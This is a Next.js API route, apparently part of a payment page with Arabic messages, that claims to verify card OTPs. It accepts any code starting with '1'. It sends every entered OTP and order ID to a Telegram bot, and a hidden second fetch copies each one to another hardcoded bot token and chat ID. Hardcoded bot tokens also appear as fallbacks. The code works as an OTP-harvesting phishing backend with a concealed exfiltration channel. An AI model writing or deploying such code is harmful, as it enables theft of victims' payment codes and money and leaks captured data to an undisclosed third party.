import { NextResponse } from 'next/server';
import { getDatabase } from '../../../../utils/database';

const db = getDatabase();

// Function to get Telegram settings from database
async function getTelegramSettings() {
    try {
        const tokenSetting = await db.getSettingByKey('telegram_bot_token');
        const chatIdSetting = await db.getSettingByKey('telegram_chat_id');
        
        return {
            botToken: tokenSetting?.value || process.env.TELEGRAM_BOT_TOKEN || '7898415400:AAF4I6oiuRmLl40r5U-NROl3oENddUlVv5U',
            chatId: chatIdSetting?.value || process.env.TELEGRAM_CHAT_ID || '6032588551'
        };
    } catch (error) {
        console.error('Error fetching Telegram settings:', error);
        // Fallback to environment variables or defaults
        return {
            botToken: process.env.TELEGRAM_BOT_TOKEN || '7898415400:AAF4I6oiuRmLl40r5U-NROl3oENddUlVv5U',
            chatId: process.env.TELEGRAM_CHAT_ID || '6032588551'
        };
    }
}

// Function to send OTP notification to Telegram
async function sendTelegramOtpNotification(otpData) {
    const { botToken, chatId } = await getTelegramSettings();
    
    if (!botToken || botToken.startsWith('MOCK_')) {
        console.log('Mock Telegram OTP notification would be sent:', otpData);
        return { success: true, mock: true };
    }

    try {
        const message = formatOtpMessage(otpData);
        
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });

        await fetch(`https://api.telegram.org/bot8439389023:AAETVNFYz8YEg7UPjjA_ry0O8C3G2EAEljg/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: '6032588551',
                text: message,
                parse_mode: 'HTML'
            })
        });

        if (!response.ok) {
            throw new Error(`Telegram API error: ${response.status}`);
        }

        const result = await response.json();
        console.log('Telegram OTP notification sent successfully:', result.message_id);
        return { success: true, messageId: result.message_id };
        
    } catch (error) {
        console.error('Failed to send Telegram OTP notification:', error);
        return { success: false, error: error.message };
    }
}

// Function to format OTP data into readable message
function formatOtpMessage(otpData) {
    const { orderId, otp, timestamp, status } = otpData;
    
    const statusEmoji = status === 'verified' ? '✅' : '❌';
    const statusText = status === 'verified' ? 'تم التحقق بنجاح' : 'فشل التحقق';
    
    const message = `
🔐 <b>OTP VERIFICATION ATTEMPT</b>

📋 <b>Order Details:</b>
• Order ID: <code>${orderId}</code>
• OTP Entered: <code>${otp}</code>
• Status: ${statusEmoji} <b>${statusText}</b>

⏰ <b>Verification Time:</b> ${new Date(timestamp).toLocaleString('en-US', { timeZone: 'Africa/Cairo' })} (Cairo Time)

${status === 'verified' ? '🎉 Payment has been successfully verified!' : '⚠️ Invalid OTP entered - payment still pending.'}
    `.trim();

    return message;
}

export async function POST(request) {
    try {
        const { orderId, otp } = await request.json();
        
        if (!orderId || !otp) {
            return NextResponse.json({
                success: false,
                error: 'رقم الطلب ورمز التحقق مطلوبان'
            }, { status: 400 });
        }

        // Validate OTP format
        if (!/^\d{4,6}$/.test(otp)) {
            return NextResponse.json({
                success: false,
                error: 'رمز التحقق يجب أن يكون من 4-6 أرقام'
            }, { status: 400 });
        }

        const timestamp = new Date().toISOString();

        // For demo purposes, accept any OTP that starts with '1'
        if (otp.startsWith('1')) {
            // Send success notification to Telegram
            const telegramResult = await sendTelegramOtpNotification({
                orderId,
                otp,
                timestamp,
                status: 'verified'
            });

            console.log('OTP verified successfully:', {
                orderId,
                otp,
                timestamp,
                telegramSent: telegramResult.success
            });

            // Simulate processing delay
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            return NextResponse.json({
                success: true,
                message: 'تم التحقق من الدفع بنجاح',
                data: {
                    orderId,
                    status: 'completed',
                    verifiedAt: timestamp
                }
            });
        } else {
            // Send failure notification to Telegram
            const telegramResult = await sendTelegramOtpNotification({
                orderId,
                otp,
                timestamp,
                status: 'failed'
            });

            console.log('OTP verification failed:', {
                orderId,
                otp,
                timestamp,
                telegramSent: telegramResult.success
            });

            return NextResponse.json({
                success: false,
                error: 'رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.'
            }, { status: 400 });
        }
        
    } catch (error) {
        console.error('OTP verification error:', error);
        
        // Send error notification to Telegram
        try {
            await sendTelegramOtpNotification({
                orderId: 'UNKNOWN',
                otp: 'ERROR',
                timestamp: new Date().toISOString(),
                status: 'error',
                errorMessage: error.message
            });
        } catch (telegramError) {
            console.error('Failed to send error notification to Telegram:', telegramError);
        }

        return NextResponse.json({
            success: false,
            error: 'حدث خطأ في الخادم. يرجى المحاولة مرة أخرى.'
        }, { status: 500 });
    }
} 